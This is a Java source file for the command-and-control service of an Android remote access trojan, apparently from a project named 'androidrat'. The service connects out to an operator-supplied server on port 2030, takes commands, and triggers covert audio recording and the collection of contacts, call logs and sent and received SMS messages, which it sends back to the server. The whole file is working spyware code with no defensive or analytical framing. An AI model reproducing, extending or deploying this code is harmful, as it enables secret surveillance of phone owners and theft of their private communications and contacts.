package com.example.androidrat.services;

import android.os.Handler;
import android.util.Log;

import com.example.androidrat.MainActivity;
import com.example.androidrat.interfaces.Response;
import com.example.androidrat.payloads.CallLogsPayload;
import com.example.androidrat.payloads.ContactsPayload;
import com.example.androidrat.payloads.ReceivedMessagesPayload;
import com.example.androidrat.payloads.SentMessagesPayload;
import com.example.androidrat.payloads.StartRecordingPayload;
import com.example.androidrat.payloads.StopRecordingPayload;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

public class ServerService extends Thread{
    private final MainActivity mainActivity;
    private final Handler handler;
    private final BlockingQueue<Response> responses;
    private final String serverIp;
    public ServerService(MainActivity mainActivity, Handler handler, String serverIp) {
        super();
        this.mainActivity = mainActivity;
        this.handler = handler;
        this.serverIp = serverIp;
        responses = new LinkedBlockingQueue<>();
    }
    private void log(String message) {
        Log.i("ServerService", message);
    }
    @Override
    public void run() {
        int Port = 2030;
        Socket serverSocket = new Socket();
        try {
            serverSocket = new Socket(InetAddress.getByName(serverIp), Port);
            log("Successfully connected to server...");

            ObjectInputStream inputStream = new ObjectInputStream(serverSocket.getInputStream());
            ObjectOutputStream outputStream = new ObjectOutputStream(serverSocket.getOutputStream());
            log("Successfully obtained I/O streams");

            while(!interrupted()) {
                try {
                    Object payload = inputStream.readObject();
                    processPayload(payload);

                    Response payloadResponse = responses.take();
                    outputStream.reset();
                    outputStream.writeObject(payloadResponse);
                    outputStream.flush();
                    log("Sent payload response");
                }catch (ClassNotFoundException e) {
                    Log.e("ServerService", "Received unknown payload from server");
                }catch (InterruptedException e) {
                    Log.e("ServerService", "Failed retrieving response from responses");
                }
            }
        }catch (IOException e) {
            Log.e("ServerService", "Failed connecting to server");
        }
        finally {
            try {
                serverSocket.close();
            } catch (IOException e) {
                Log.e("ServerService", "Failed closing server connection");
            }
        }
    }
    private void processPayload(Object payload) {
        if(payload instanceof StartRecordingPayload) {
            handler.post(mainActivity::onStartRecording);
        }else if(payload instanceof StopRecordingPayload) {
            handler.post(mainActivity::onStopRecording);
        }else if(payload instanceof ContactsPayload) {
            handler.post(mainActivity::onGetContacts);
        }else if(payload instanceof CallLogsPayload) {
            handler.post(mainActivity::onGetCallLogs);
        }else if(payload instanceof ReceivedMessagesPayload) {
            handler.post(mainActivity::onGetReceivedMessages);
        }else if(payload instanceof SentMessagesPayload) {
            handler.post(mainActivity::onGetSentMessages);
        }
    }
    public void addResponse(Response response) {
        responses.add(response);
    }
}
